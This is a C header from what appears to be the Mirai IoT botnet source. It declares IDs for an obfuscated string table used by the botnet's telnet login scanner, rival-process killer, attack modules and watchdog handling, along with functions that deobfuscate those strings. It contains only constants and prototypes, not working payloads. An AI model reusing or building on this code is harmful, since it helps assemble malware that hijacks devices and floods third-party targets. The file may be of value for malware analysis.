#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value
{
    char *val;
    uint16_t val_len;

    #ifdef DEBUG
        BOOL locked;
    #endif
};

#define TABLE_EXEC_SUCCESS 1
#define TABLE_SCAN_SHELL 2
#define TABLE_SCAN_ENABLE 3
#define TABLE_SCAN_SYSTEM 4
#define TABLE_SCAN_SH 5
#define TABLE_SCAN_QUERY 6
#define TABLE_SCAN_RESP 7
#define TABLE_SCAN_NCORRECT 8
#define TABLE_SCAN_ASSWORD 9
#define TABLE_SCAN_OGIN 10
#define TABLE_SCAN_ENTER 11
#define TABLE_SCAN_POST 12
#define TABLE_SCAN_CONTENTLEN 13
#define TABLE_SCAN_CONNECTION 14
#define TABLE_SCAN_ACCEPT 15
#define TABLE_SCAN_AUTH 16
#define TABLE_SCAN_HEADER 17
#define TABLE_SCAN_HEADER2 18
#define TABLE_KILLER_PROC 19
#define TABLE_KILLER_EXE 20 
#define TABLE_KILLER_FD 21
#define TABLE_KILLER_MAPS 22
#define TABLE_KILLER_TCP 23
#define TABLE_MAPS_MIRAI 24
#define TABLE_ATK_VSE 25
#define TABLE_ATK_RESOLVER 26
#define TABLE_ATK_NSERV 27
#define TABLE_MISC_WATCHDOG 28
#define TABLE_MISC_WATCHDOG2 29
#define TABLE_MISC_WATCHDOG3 30
#define TABLE_MISC_WATCHDOG4 31
#define TABLE_MISC_RANDOM 32

#define TABLE_MAX_KEYS 33

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
